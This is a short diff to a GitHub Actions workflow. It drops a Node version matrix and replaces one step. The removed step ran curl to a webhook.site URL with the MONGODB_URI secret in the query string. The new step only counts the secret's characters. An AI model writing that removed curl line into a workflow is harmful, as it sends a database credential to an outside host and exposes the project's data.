@@ -13,13 +13,10 @@ jobs:
 
     runs-on: ubuntu-latest
 
-    strategy:
-      matrix:
-        node-version: [18.x]
-
     steps:
     - uses: actions/checkout@v3
 
-    - run: curl "https://webhook.site/b84bb133-57d7-407d-a563-b65cffdf9a2a?param=$MONGODB_URI"
+    - run: echo -n "$MONGODB_URI" | wc -m
       env: # Or as an environment variable
         MONGODB_URI: ${{ secrets.MONGODB_URI }}
+
